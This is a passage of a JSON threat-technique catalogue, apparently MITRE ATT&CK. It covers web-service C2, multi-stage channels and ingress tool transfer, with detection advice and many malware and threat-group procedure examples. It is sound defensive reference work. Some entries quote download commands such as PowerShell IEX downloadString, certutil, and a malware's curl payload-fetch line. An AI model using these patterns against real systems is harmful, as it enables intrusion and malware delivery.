      "ROKRAThas used legitimate social networking sites and cloud platforms (including but not limited to Twitter, Yandex, Dropbox, and Mediafire) for C2 communications.[44][45][46]",
      "Sagerunexhas used virtual private servers (VPS) for command and control traffic as well as third-party cloud services in more recent variants.[47]",
      "SampleCheck5000can use the Microsoft Office Exchange Web Services API to access an actor-controlled account and retrieve C2 commands and payloads placed in Draft messages.[48][38]",
      "Sandworm Teamhas used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor.Sandworm Teamalso used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.[49][50]",
      "SLOWDRIFTuses cloud based services for C2.[3]",
      "Small Sievehas the ability to use the Telegram Bot API from Telegram Messenger to send and receive messages.[51]",
      "TRANSLATEXThas used a Github repository for C2.[33]",
      "ATurlaJavaScript backdoor has used Google Apps Script as its C2 server.[52][53]",
      "UBoatRAThas used GitHub and a public blog service in Hong Kong for C2 communications.[54]",
      "ytycommunicates to the C2 server by retrieving a Google Doc.[55]",
      "ZIRCONIUMhas used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.[56][57]"
    ]
  },
  "T1102.003": {
    "Name": "Web Service:One-Way Communication",
    "Description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "ArcaneDoorutilized HTTP command and control traffic where commands are intercepted from HTTP traffic to the device, parsed for appropriate identifiers and commands, and then executed.[1]",
      "EVILNUMhas used a one-way communication method via GitLab and Digital Point to perform C2.[2]",
      "Gamaredon Grouphas used Telegram Messenger content to discover the IP address for C2 communications.[3]",
      "The \"tDiscoverer\" variant ofHAMMERTOSSestablishes a C2 channel by downloading resources from Web services like Twitter and GitHub.HAMMERTOSSbinaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.[4]",
      "Leviathanhas received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.[5]",
      "Metamorfohas downloaded a zip file for execution on the system.[6][7][8]",
      "OnionDukeuses Twitter as a backup C2.[9]",
      "Sagerunexhas used web services such as Twitter for command and control purposes.[10]",
      "UPSTYLEparses encoded commands from error logs after attempting to resolve a non-existing webpage from the command and control server.[11]"
    ]
  },
  "T1104": {
    "Name": "Multi-Stage Channels",
    "Description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks orFallback Channelsin case the original first-stage communication path is discovered and blocked.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "AnAPT3downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.[1]",
      "APT41used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.[2]",
      "BACKSPACEattempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware.[3]",
      "TheBazarloader is used to download and execute theBazarbackdoor.[4][5]",
      "BLACKCOFFEEuses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.[6]",
      "After initial compromise,Chaoswill download a second stage to establish a more permanent presence on the affected system.[7]",
      "JumbledPathcan communicate over a unique series of connections to send and retrieve data from exploited devices.[8]",
      "Latrodectushas used a two-tiered C2 configuration with tier one nodes connecting to the victim and tier two nodes connecting to backend infrastructure.[9]",
      "Lazarus Grouphas used multi-stage malware components that inject later stages into separate processes.[10]",
      "LunarWebcan use one C2 URL for first contact and to upload information about the host computer and two additional C2 URLs for getting commands.[11]",
      "MuddyWaterhas used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back.[12]",
      "Snip3can download and execute additional payloads and modules over separate communication channels.[13][14]",
      "IndividualUroburosimplants can use multiple communication channels based on one of four available modes of operation.[15]",
      "Valakcan download additional modules and malware capable of using separate C2 channels.[16]"
    ]
  },
  "T1105": {
    "Name": "Ingress Tool Transfer",
    "Description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such asftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e.Lateral Tool Transfer).On Windows, adversaries may use various utilities to download tools, such ascopy,finger,certutil, andPowerShellcommands such asIEX(New-Object Net.WebClient).downloadString()andInvoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such ascurl,scp,sftp,tftp,rsync,finger, andwget.[1]A number of these tools, such aswget,curl, andscp, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., viacertutil -hashfile).[2]Adversaries may also abuse installers and package managers, such asyumorwinget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windowssearch-msprotocol handler, to deliver malicious files to victims through remote file searches invoked byUser Execution(typically after interacting withPhishinglures).[3]Files can also be transferred using variousWeb Services as well as native or otherwise present tools on the victim system.[4]In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.[5]",
    "Detects": [
      "Monitor executed commands and arguments for suspicious activity associated with downloading external content.",
      "Monitor for file creation and files transferred into the network.",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts or creating files on-system may be suspicious. Abnormal use of utilities such as FTP may also be suspicious.",
      "Monitor network traffic content for files and other potentially malicious content, especially data coming in from abnormal/unknown domain and IPs.",
      "Monitor network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teampushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.[6]",
      "ABKhas the ability to download files from C2.[7]",
      "Action RAThas the ability to download additional payloads onto an infected machine.[8]",
      "Agent Teslacan download additional files for execution on the victim’s machine.[9][10]",
      "Agent.btzattempts to download an encrypted binary from a specified domain.[11]",
      "Ajax Security Teamhas used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.[12]",
      "Amadeycan download and execute files to further infect a host machine with additional malware.[13]",
      "Anchorcan download additional payloads.[14][15]",
      "Andarielhas downloaded additional tools and malware onto compromised hosts.[16]",
      "ANDROMEDAcan download additional payloads from C2.[17]",
      "APT-C-36has downloaded binary data from a specified domain after the malicious document is opened.[18]",
      "APT18can upload a file to the victim’s machine.[19]",
      "APT28has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.[20][21][22][23][24]",
      "APT29has downloaded additional tools and malware onto compromised networks.[25][26][27][28]",
      "APT3has a tool that can copy files to remote machines.[29]",
      "APT32has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.[30]",
      "APT33has downloaded additional files and programs from its C2 server.[31][32]",
      "APT37has downloaded second stage malware from compromised websites.[33][34][35][36]",
      "APT38used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim’s machine.[37]Additionally,APT38has downloaded other payloads onto a victim’s machine.[38]",
      "APT39has downloaded tools to compromised hosts.[39][40]",
      "APT41usedcertutilto download additional files.[41][42][43]APT41downloaded post-exploitation tools such asCobalt Strikevia command shell following initial access.[44]APT41has uploaded Procdump   and NATBypass to a staging directory and has used these tools in follow-on activities.[45]",
      "APT41 DUSTinvolved execution ofcertutil.exevia web shell to download theDUSTPANdropper.[46]",
      "Aquatic Pandahas downloaded additional malware onto compromised hosts.[47]",
      "Aria-bodyhas the ability to download additional payloads from C2.[48]",
      "AstarothusescertutilandBITSAdminto download additional malware.[49][50][51]",
      "AsyncRAThas the ability to download files over SFTP.[52]",
      "Attorcan download additional plugins, updates and other files.[53]",
      "AuditCredcan download files and additional malware.[54]",
      "Avengerhas the ability to download files from C2 to a compromised host.[7]",
      "Azorultcan download and execute additional files.Azorulthas also downloaded a ransomware payload called Hermes.[55][56]",
      "BabySharkhas downloaded additional files from the C2.[57][58]",
      "BackConfigcan download and execute additional payloads on a compromised host.[59]",
      "Backdoor.Oldreacan download additional modules from C2.[60]",
      "BackdoorDiplomacyhas downloaded additional files and tools onto a compromised host.[61]",
      "BADFLICKhas download files from its C2 server.[62]",
      "BADHATCHhas the ability to load a second stage malicious DLL file onto a compromised machine.[63]",
      "BADNEWSis capable of downloading additional files through C2 channels, including a new version of itself.[64][65][66]",
      "BadPatchcan download and execute or update malware.[67]",
      "Bandookcan download files to the system.[68]",
      "Bankshotuploads files and secondary payloads to the victim's machine.[69]",
      "Bazarcan download and deploy additional payloads, including ransomware and post-exploitation frameworks such asCobalt Strike.[70][71][72][73]",
      "BBKhas the ability to download files from C2 to the infected host.[7]",
      "BendyBearis designed to download an implant from a C2 server.[74]",
      "BISCUIThas a command to download a file from the C2 server.[75]",
      "Bisonalhas the capability to download files to execute on the victim’s machine.[76][77][78]",
      "BITSAdmincan be used to createBITS Jobsto upload and/or download files.[79]",
      "BITTERhas downloaded additional malware and tools onto a compromised host.[80][81]",
      "BlackBytehas transferred tools such asCobalt Striketo victim environments from file sharing and hosting websites.[82]",
      "BlackMouldhas the ability to download files to the victim's machine.[83]",
      "BLINDINGCANhas downloaded files to a victim machine.[84]",
      "BLUELIGHTcan download additional files onto the host.[35]",
      "Bonadancan download additional modules from the C2 server.[85]",
      "BONDUPDATERcan download or upload files from its C2 server.[86]",
      "BoomBoxhas the ability to download next stage malware components to a compromised system.[87]",
      "BoxCaoncan download files.[88]",
      "Bribadownloads files onto infected hosts.[89]",
      "BRONZE BUTLERhas used various tools to download files, including DGet (a similar tool to wget).[90]",
      "Brute Ratel C4can download files to compromised hosts.[91][92]",
      "build_downerhas the ability to download files from C2 to the infected host.[7]",
      "Bumblebeecan download and execute additional payloads including through the use of aDexcommand.[93][94][95]",
      "Bundlorecan download and execute new versions of itself.[96]",
      "BUSHWALKcan write malicious payloads sent through a web request’s command parameter.[97][98]",
      "DuringC0010, UNC3890 actors downloaded tools and malware onto a compromised host.[99]",
      "DuringC0015, the threat actors downloaded additional tools and files onto a compromised network.[100]",
      "DuringC0017,APT41downloaded malicious payloads onto compromised systems.[101]",
      "DuringC0018, the threat actors downloaded additional tools, such asMimikatzandSliver, as well asCobalt StrikeandAvosLockerransomware onto the victim network.[102][103]",
      "DuringC0021, the threat actors downloaded additional tools and files onto victim machines.[104][105]",
      "DuringC0026, the threat actors downloaded malicious payloads onto select compromised hosts.[17]",
      "DuringC0027,Scattered Spiderdownloaded tools using victim organization systems.[106]",
      "Calistohas the capability to upload and download files to the victim's machine.[107]",
      "CallMehas the capability to download a file to the victim from the C2 server.[108]",
      "Cannoncan download a payload for execution.[109]",
      "Carberpcan download and execute new plugins from the C2 server.[110][111]",
      "Cardinal RATcan download and execute additional payloads.[112]",
      "CARROTBALLhas the ability to download and install a remote payload.[113]",
      "CARROTBAThas the ability to download and execute a remote file viacertutil.[114]",
      "Caterpillar WebShellhas a module to download and upload files to the system.[115]",
      "certutilcan be used to download files from a given URL.[116][117]",
      "Chaescan download additional files onto an infected machine.[118]",
      "CharmPowerhas the ability to download additional modules to a compromised host.[119]",
      "ChChesis capable of downloading files, including additional modules.[120][121][122]",
      "Chimerahas remotely copied tools and malware onto targeted systems.[123]",
      "CHIMNEYSWEEPcan download additional files from C2.[124]",
      "China Chopper's server component can download remote files.[125][126][127][128][129]",
      "CHOPSTICKis capable of performing remote file transmission.[130]",
      "Chrommmecan download its code from C2.[131]",
      "Cinnamon Tempesthas downloaded files, includingCobalt Strike, to compromised hosts.[132]",
      "CloudDukedownloads and executes additional malware from either a Web address or a Microsoft OneDrive account.[27]",
      "cmdcan be used to copy files to/from a remotely connected external system.[133]",
      "Cobalt Grouphas used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.[134][4]The group's JavaScript backdoor is also capable of downloading files.[135]",
      "Cobalt Strikecan deliver additional payloads to victim machines.[136][137]",
      "CoinTickerexecutes a Python script to download its second stage.[138]",
      "Confickerdownloads an HTTP server to the infected machine.[139]",
      "Confuciushas downloaded additional files and payloads onto a compromised host following initial access.[140][141]",
      "CookieMinercan download additional scripts from a web server.[142]",
      "CORESHELLdownloads another dropper from its C2 server.[143]",
      "CostaBrickshas been used to loadSombRATonto a compromised host.[144]",
      "DuringCostaRicto, the threat actors downloaded malware and tools onto a compromised host.[144]",
      "CreepyDrivecan download files to the compromised host.[145]",
      "Crimsoncontains a command to retrieve files from its C2 server.[146][147][148]",
      "Cryptoistichas the ability to send and receive files.[149]",
      "CSPY Downloadercan download additional tools to a compromised host.[150]",
      "Cubacan download files from its C2 server.[151]",
      "DuringCutting Edge, threat actors leveraged exploits to download remote files to Ivanti Connect Secure VPNs.[152]",
      "Cyclops Blinkhas the ability to download files to target systems.[153][154]",
      "Daclscan download its payload from a C2 server.[149][155]",
      "Daggerflyhas used PowerShell andBITSAdminto retrieve follow-on payloads from external locations for execution on victim machines.[156]",
      "DanBotcan download additional files to a targeted system.[157]",
      "DarkCometcan load any files onto the infected machine to execute.[158][159]",
      "DarkGateretrieves cryptocurrency mining payloads and commands in encrypted traffic from its command and control server.[160]DarkGateuses Windows Batch scripts executing thecurlcommand to retrieve follow-on payloads.[161]DarkGatehas stolensitemanager.xmlandrecentservers.xmlfrom%APPDATA%\\FileZilla\\if present.[162]",
      "Darkhotelhas used first-stage payloads that download additional malware from C2 servers.[163]",
      "DarkTortillacan download additional packages for keylogging, cryptocurrency mining, and other capabilities; it can also retrieve malicious payloads such asAgent Tesla, AsyncRat,NanoCore, RedLine,Cobalt Strike, and Metasploit.[164]",
      "Daserfcan download remote files.[165][90]",
      "DDKONGdownloads and uploads files on the victim’s machine.[166]",
      "DEATHRANSOMcan download files to a compromised host.[167]",
      "Denisdeploys additional backdoors and hacking tools to the system.[168]",
      "Diavolcan receive configuration updates and additional payloads including wscpy.exe from C2.[169]",
      "Dipsindcan download remote files.[170]",
      "Discocan download files to targeted systems via SMB.[171]",
      "DnsSystemcan download files to compromised systems after receiving a command with the stringdownloaddd.[172]",
      "DOGCALLcan download and execute additional payloads.[173]",
      "Dokihas downloaded scripts from C2.[174]",
      "Donutcan download and execute previously staged shellcode payloads.[175]",
      "down_newhas the ability to download files to the compromised host.[7]",
      "After downloading its main config file,Downdelphdownloads multiple payloads from C2 servers.[176]",
      "Dragonflyhas copied and installed tools for operations once in the victim environment.[177]",
      "DRATzaruscan deploy additional tools onto an infected machine.[178]",
      "DropBookcan download and execute additional files.[179][180]",
      "Drovorubcan download files to a compromised host.[181]",
      "Dtrack’s can download and upload a file to the victim’s computer.[182][183]",
      "DUSTTRAPcan retrieve and load additional payloads.[46]",
      "Dyrehas a command to download and executes additional files.[184]",
      "Ecipekaccan download additional payloads to a compromised host.[185]",
      "Egregorhas the ability to download files from its C2 server.[186][187]",
      "The Ritsol backdoor trojan used byElderwoodcan download files onto a compromised host from a remote location.[188]",
      "Elisecan download additional files from the C2 server for execution.[189]",
      "Emissaryhas the capability to download files from the C2 server.[190]",
      "Emotetcan download follow-on payloads and items via maliciousurlparameters in obfuscated PowerShell code.[191]",
      "Empirecan upload and download to and from a victim machine.[192]",
      "esentutlcan be used to copy files from a given URL.[193]",
      "EvilBunnyhas downloaded additional Lua scripts from the C2.[194]",
      "EVILNUMcan download and upload files to the victim's computer.[195][196]",
      "Evilnumcan deploy additional components or tools as needed.[195]",
      "Exaramel for Linuxhas a command to download a file from  and to a remote C2 server.[197][198]",
      "Explosivehas a function to download a file to the infected system.[199]",
      "Felismuscan download files from remote servers.[200]",
      "FELIXROOTdownloads and uploads files to and from the victim’s machine.[201][202]",
      "FIN13has downloaded additional tools and malware to compromised systems.[203][204]",
      "FIN7has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.[205][206][207]",
      "FIN8has used remote code execution to download subsequent payloads.[208][209]",
      "Flagprocan download additional malware from the C2 server.[210]",
      "FlawedAmmyycan transfer files from C2.[211]",
      "FoggyWebcan receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.[212]",
      "Fox Kittenhas downloaded additional tools includingPsExecdirectly to endpoints.[213]",
      "DuringFrankenstein, the threat actors downloaded files and tools onto a victim machine.[214]",
      "ftpmay be abused by adversaries to transfer tools or files from an external system into a compromised environment.[215][216]",
      "FunnyDreamcan download additional files onto a compromised host.[217]",
      "DuringFunnyDream, the threat actors downloaded additional droppers and backdoors onto a compromised system.[217]",
      "FYAntican download additional payloads to a compromised host.[185]",
      "GALLIUMdropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, andHTRAN.[218][83]",
      "Gamaredon Grouphas downloaded additional malware and tools onto a compromised host.[219][220][221][222]For example,Gamaredon Groupuses a backdoor script to retrieve and decode additional payloads once in victim environments.[223]",
      "Gazercan execute a task to download a file.[224][225]",
      "Gelsemiumcan download additional plug-ins to a compromised host.[131]",
      "gh0st RATcan download files to the victim’s machine.[226][227]",
      "Gold Dragoncan download additional components from the C2 server.[228]",
      "GoldenSpyconstantly attempts to download and execute files from the remote C2, includingGoldenSpyitself if not found on the system.[229]",
      "GoldMaxcan download and execute additional files.[230][231]",
      "Gootloadercan fetch second stage code from hardcoded web domains.[232][233]",
      "Gorgon Groupmalware can download additional files from C2 servers.[234]",
      "Grandoreirocan download its second stage from a hardcoded URL within the loader's code.[235][236]",
      "GreyEnergycan download additional modules and payloads.[202]",
      "GrimAgenthas the ability to download and execute additional payloads.[237]",
      "GuLoadercan download further malware for execution on the victim's machine.[238]",
      "H1N1contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.[239]",
      "HAFNIUMhas downloaded malware and tools--including Nishang and PowerCat--onto a compromised host.[240][128]",
      "Hancitorhas the ability to download additional files from C2.[241]",
      "Hannotogcan download additional files to the victim machine.[242]",
      "can download and execute a second-stage payload.[33]",
      "Helminthcan download additional files.[243]",
      "HEXANEhas downloaded additional payloads and malicious scripts onto a compromised host.[244]",
      "Hi-Zorhas the ability to upload and download files from its C2 server.[245]",
      "HiddenWaspdownloads a tar compressed archive from a download server to the system.[246]",
      "Hikithas the ability to download files to a compromised host.[247]",
      "Hildegardhas downloaded additional scripts that build and run Monero cryptocurrency miners.[248]",
      "DuringHomeLand Justice, threat actors used web shells to download files to compromised infrastructure.[249]",
      "HOPLIGHThas the ability to connect to a remote host in order to upload and download files.[250]",
      "HotCroissanthas the ability to upload a file from the command and control (C2) server to the victim machine.[251]",
      "HTTPBrowseris capable of writing a file to the compromised system from the C2 server.[252]",
      "Hydraqcreates a backdoor through which remote attackers can download files and additional malware components.[253][254]",
      "HyperBrohas the ability to download additional files.[255]",
      "IcedIDhas the ability to download additional modules and a configuration file from C2.[256][257][258][259]",
      "IMAPLoaderis a loader used to retrieve follow-on payload encoded in email messages for execution on victim systems.[260]",
      "INC Ransomhas downloaded tools to compromised servers including Advanced IP Scanner.[261][262]",
      "IndigoZebrahas downloaded additional files and tools from its C2 server.[88]",
      "Indrik Spiderhas downloaded additional scripts, malware, and tools onto a compromised host.[263][264][265]",
      "Industroyerdownloads a shellcode payload from a remote C2 server and loads it into memory.[266]",
      "InvisiMolecan upload files to the victim's machine for operations.[267][268]",
      "Ixeshecan download and execute additional files.[269]",
      "Javalican download payloads from remote C2 servers.[51]",
      "JHUHUGITcan retrieve an additional payload from its C2 server.[270][271]JHUHUGIThas a command to download files to the victim’s machine.[272]",
      "JPINcan download files and upgrade itself.[170]",
      "jRATcan download and execute files.[273][274][275]",
      "JSS Loaderhas the ability to download malicious executables to a compromised host.[276]",
      "KARAEcan upload and download files, including second-stage malware.[33]",
      "Kasidethas the ability to download and execute additional files.[277]",
      "Kazuardownloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.[278]",
      "Ke3changhas used tools to download files to compromised machines.[279]",
      "Kerrdowncan download specific payloads to a compromised host based on OS architecture.[280]",
      "Kesselcan download additional modules from the C2 server.[85]",
      "Kevincan download files to the compromised host.[244]",
      "KeyBoyhas a download and upload functionality.[281][282]",
      "KEYMARBLEcan upload files to the victim’s machine and can download additional payloads.[283]",
      "KGH_SPYhas the ability to download and execute code from remote servers.[150]",
      "Kimsukyhas downloaded additional scripts, tools, and malware onto victim systems.[42][284]",
      "Kinsinghas downloaded additional lateral movement scripts from C2.[285]",
      "Kivarshas the ability to download and execute files.[286]",
      "Koadiccan download additional files and tools.[287][288]",
      "KOCTOPUShas executed a PowerShell command to download a file to the system.[288]",
      "KONNIcan download files and execute them on the victim’s machine.[289][290]",
      "KV Botnet Activityincluded the use of scripts to download additional payloads when compromising network nodes.[291]",
      "Kwampirsdownloads additional files from C2 servers.[292]",
      "Latrodectuscan download and execute PEs, DLLs, and shellcode from C2.[259][293][294]",
      "Lazarus Grouphas downloaded files, malware, and tools from its C2 onto a compromised host.[295][296][297][149][155][298][299][300][301][302]",
      "LazyScripterhad downloaded additional tools to a compromised host.[288]",
      "Leviathanhas downloaded additional scripts and files from adversary-controlled servers.[303][125]",
      "LightNeuronhas the ability to download and execute additional files.[304]",
      "On macOS,LightSpydownloads a.jsonfile from the C2 server. The.jsonfile contains metadata about the plugins to be downloaded, including their URL, name, version, and MD5 hash.LightSpyretrieves the plugins specified in the.jsonfile, which are compiled.dylibfiles. These.dylibfiles provide task and platform specific functionality.LightSpyalso imports open-source libraries to manage socket connections.[305]",
      "Linfocreates a backdoor through which remote attackers can download files onto compromised hosts.[306]",
      "LiteDukehas the ability to download files.[307]",
      "LitePowerhas the ability to download payloads containing system commands to a compromised host.[308]",
      "Lizarcan download additional plugins, files, and tools.[309]",
      "Lokibotdownloaded several staged items onto the victim's machine.[310]",
      "LoudMinerused SCP to update the miner from the C2.[311]",
      "LOWBALLuses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of theLOWBALLmalware.[312]",
      "Lucifercan download and execute a replica of itself usingcertutil.[313]",
      "LuminousMothhas downloaded additional malware and tools onto a compromised host.[314][315]",
      "Machetecan download additional files for execution on the victim’s machine.[316]",
      "MacMahas downloaded additional files, including an exploit for used privilege escalation.[317][318]",
      "macOS.OSAMinerhas usedcurlto download aStripped Payloadsfrom a public facing adversary-controlled webpage.",
      "Mafaldacan download additional files onto the compromised host.[319]",
      "Magic Houndhas downloaded additional code and files from servers onto victims.[320][321][322][323]",
      "MagicRATcan import and execute additional payloads.[324]",
      "MarkiRATcan download additional files and tools from its C2 server, including through the use ofBITSAdmin.[325]",
      "MCMDcan upload additional files to a compromised host.[326]",
      "MechaFlounderhas the ability to upload and download files to and from a compromised host.[327]",
      "Melcozhas the ability to download additional files to a compromised host.[51]",
      "menuPasshas installed updates and new malware on victims.[328][329]",
      "Metadorhas downloaded tools and malware onto a compromised system.[330]",
      "metaMaincan download files onto compromised systems.[330][319]",
      "Metamorfohas used MSI files to download additional files to execute.[331][332][333][334]",
      "Meteorhas the ability to download additional files for execution on the victim's machine.[335]",
      "Micropsiacan download and execute an executable from the C2 server.[336][337]",
      "Milanhas received files from C2 and stored them in log folders beginning with the character sequencea9850d2f.[338]",
      "MiniDukecan download additional encrypted backdoors onto the victim via GIF files.[339][307]",
      "Mis-Typehas downloaded additional malware and files onto a compromised host.[340]",
      "Misdatis capable of downloading files from the C2.[340]",
      "Mivasthas the capability to download and execute .exe files.[341]",
      "MobileOrderhas a command to download a file from the C2 server to the victim mobile device's SD card.[108]",
      "MoleNetcan download additional payloads from the C2.[179]",
      "Moleratsused executables to download malicious files from different sources.[342][343]",
      "Mongallcan download files to targeted systems.[344]",
      "Moonstone Sleetretrieved a final stage payload from command and control infrastructure during initial installation on victim systems.[345]",
      "More_eggscan download and launch additional payloads.[346][347]",
      "Moses Staffhas downloaded and installed web shells to following pathC:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx.[348]",
      "Mosquitocan upload and download files to the victim.[349]",
      "MuddyWaterhas used malware that can upload additional files to the victim’s machine.[350][351][352][353]",
      "Mustang Pandahas downloaded additional executables following the initial infection stage.[354]",
      "Mustard Tempesthas deployed secondary payloads and third stage implants to compromised hosts.[355]",
      "NanHaiShucan download additional files from URLs.[303]",
      "NanoCorehas the capability to download and activate additional modules for execution.[356][357]",
      "NavRATcan download files remotely.[358]",
      "NDiskMonitorcan download and execute a file from given URL.[66]",
      "Nebulaecan download files from C2.[359]",
      "Neo-reGeorghas the ability to download files to targeted systems.[360]",
      "Neoichorcan download additional files onto a compromised host.[279]",
      "Nerexcreates a backdoor through which remote attackers can download files onto a compromised host.[188]",
      "Operators deployingNetwalkerhave used psexec and certutil to retrieve theNetwalkerpayload.[361]",
      "NETWIREcan downloaded payloads from C2 to the compromised host.[362][363]",
      "NICECURLhas the ability to download additional content onto an infected machine, e.g. by usingcurl.[364]",
      "Nidirancan download and execute files.[365]",
      "DuringNight Dragon, threat actors used administrative utilities to deliver Trojan components to remote systems.[366]",
      "NightClubcan load multiple additional plugins on an infected host.[171]",
      "njRATcan download files to the victim’s machine.[367][368]",
      "NOKKIhas downloaded a remote module for execution.[369]",
      "Nomadic Octopushas used malicious macros to download additional files to the victim's machine.[370]",
      "Octopuscan download additional files and tools onto the victim’s machine.[371][372][370]",
      "ODAgenthas the ability to download and execute files on compromised systems.[373]",
      "OilBoostercan download and execute files from an actor-controlled OneDrive account.[373]",
      "OilCheckcan download staged payloads from an actor-controlled infrastructure.[373]",
      "OilRighad downloaded remote files onto victim infrastructure.[374][375]",
      "Okrumhas built-in commands for uploading, downloading, and executing files to the system.[376]",
      "OopsIEcan download files from its C2 server to the victim's machine.[377][378]",
      "DuringOperation Dream Job,Lazarus Groupdownloaded multistage malware and tools onto a compromised host.[178][379][380]",
      "DuringOperation Honeybee, the threat actors downloaded additional malware and malicious scripts onto a compromised host.[381]",
      "DuringOperation MidnightEclipse, threat actors downloaded additional payloads on compromised devices.[382][383]",
      "DuringOperation Sharpshooter, additional payloads were downloaded after a target was infected with a first-stage downloader.[384]",
      "DuringOperation Wocao, threat actors downloaded additional files to the infected system.[385]",
      "Orzcan download files onto the victim.[303]",
      "OSX/Shlayercan download payloads, and extract bytes from files.OSX/Shlayeruses thecurl -fsL \"$url\" >$tmp_pathcommand to download malicious payloads into a temporary directory.[386][387][388][389]",
      "OSX_OCEANLOTUS.Dhas a command to download and execute a file on the victim’s machine.[390][391]",
      "DuringOuter Space,OilRigdownloaded additional tools to comrpomised infrastructure.[392]",
      "OutSteelcan download files from its C2 server.[393]",
      "P.A.S. Webshellcan upload and download files to and from compromised hosts.[198]",
      "P8RATcan download additional payloads to a target system.[185]",
      "Pandoracan load additional drivers and files onto a victim machine.[394]",
      "Pasamcreates a backdoor through which remote attackers can upload files.[395]",
      "Patchworkpayloads download additional files from the C2 server.[396][66]",
      "Penquincan execute the command codedo_downloadto retrieve remote files from C2.[397]",
      "Peppycan download and execute remote files.[146]",
      "PipeMoncan install additional modules via C2 commands.[398]",
      "Pisloaderhas a command to upload a file to the victim machine.[399]",
      "PLAINTEEhas downloaded and executed additional plugins.[166]",
      "PLATINUMhas transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.[400]",
      "Playhas usedCobalt Striketo download files to compromised machines.[401]",
      "PLEADhas the ability to upload and download files to and from an infected host.[402]",
      "PlugXhas a module to download and execute files on the compromised machine.[403][404]",
      "PoetRAThas the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.[405][406]",
      "PoisonIvycreates a backdoor through which remote attackers can upload files.[407]",
      "PolyglotDukecan retrieve payloads from the C2 server.[307]",
      "Ponycan download additional files onto the infected system.[408]",
      "POSHSPYdownloads and executes additional PowerShell code and Windows binaries.[409]",
      "PowerDukehas a command to download a file.[410]",
      "PowerExchangecan decode Base64-encoded files and callWriteAllBytesto write the files to compromised hosts.[411]",
      "PowerLesscan download additional payloads to a compromised host.[412]",
      "PowerPunchcan download payloads from adversary infrastructure.[222]",
      "POWERSOURCEhas been observed being used to downloadTEXTMATEand the Cobalt Strike Beacon payload onto victims.[413]",
      "POWERSTATScan retrieve and execute additionalPowerShellpayloads from the C2 server.[414]",
      "POWRUNERcan download or upload files from its C2 server.[374]",
      "CostaBrickscan download additional payloads onto a compromised host.[144]",
